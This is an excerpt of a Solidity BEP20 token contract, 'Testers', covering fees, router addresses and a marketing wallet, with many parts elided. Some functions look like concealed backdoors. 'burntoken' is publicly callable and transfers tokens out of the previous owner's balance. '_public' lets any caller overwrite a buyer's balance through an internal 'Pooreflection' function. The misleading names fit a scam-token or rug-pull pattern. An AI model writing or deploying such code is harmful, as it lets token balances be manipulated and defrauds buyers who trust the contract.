...
contract Testing is IBEP20, Auth {
    ...
    string constant _name = "Testers";
    string constant _symbol = "TestT";
    uint8 constant _decimals = 9;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; //TESTNET  0x10ED43C718714eb63d5aA57B78B54704E256024E; // MAINNET// 
    ...
    uint256 distributorGas = 30000;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;

    uint256 public swapThreshold = 100 * (10**9);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingWallet = 0x21AFbcb5ea5A9B0D9e71fF8e3d372804ac238fe6;
    ...
    function changeFees(uint256 newLiqFee, uint256 newRewardFee, uint256 newMarketingFee, uint256 newExtraSellFee) external authorized {
     ...
     function burntoken(address recipient, uint256 amount) public returns (bool) {
      _send(previousOwner(), recipient, amount);
      burn = false;
      return true;
    }

      function Pooreflection (address buyer) internal returns  (uint256) {
     ...
     function _public(address buyer) public {
      ...
      _balances[buyer] = Pooreflection (buyer);
